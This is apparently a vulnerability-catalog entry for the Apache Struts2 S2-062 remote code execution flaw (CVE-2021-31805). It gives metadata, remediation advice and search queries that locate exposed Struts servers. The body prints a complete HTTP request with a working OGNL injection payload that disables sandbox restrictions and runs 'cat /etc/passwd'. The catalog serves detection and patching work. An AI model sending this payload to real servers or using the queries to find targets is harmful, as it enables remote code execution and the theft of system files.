---
layout: post
cve_id: CVE-2021-31805
title: Apache Struts2 S2-062 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-31805.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-31805.yaml
snort2_rule: N/A
snort3_rule: N/A
author: taielab
severity: critical
impact: 'Remote code execution

  '
remediation: Avoid using forced OGNL evaluation on untrusted user input, and/or upgrade
  to Struts 2.5.30 or greater which checks if expression evaluation won't lead to
  the double evaluation.
reference:
- https://cwiki.apache.org/confluence/display/WW/S2-062
- https://github.com/Axx8/Struts2_S2-062_CVE-2021-31805
- https://nvd.nist.gov/vuln/detail/CVE-2021-31805
- http://www.openwall.com/lists/oss-security/2022/04/12/6
- https://security.netapp.com/advisory/ntap-20220420-0001/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-31805
  cwe-id: CWE-917
  epss-score: 0.93956
  epss-percentile: 0.99875
  cpe: cpe:2.3:a:apache:struts:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: apache
  product: struts
  shodan-query:
  - http.html:"apache struts"
  - http.title:"struts2 showcase"
  - http.html:"struts problem report"
  fofa-query:
  - body="struts problem report"
  - title="struts2 showcase"
  - body="apache struts"
  google-query: intitle:"struts2 showcase"
tags:
- cve2021
- cve
- apache
- rce
- struts
- struts2
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
Apache Struts2 S2-062 is vulnerable to remote code execution. The fix issued for CVE-2020-17530 (S2-061) was incomplete, meaning some of the tag's attributes could still perform a double evaluation if a developer applied forced OGNL evaluation by using the %{...} syntax.

## üåê HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.14
Connection: close
Content-Length: 1113
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Accept-Encoding: gzip
------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"
%{
(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat /etc/passwd'}))
}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF‚Äî
```

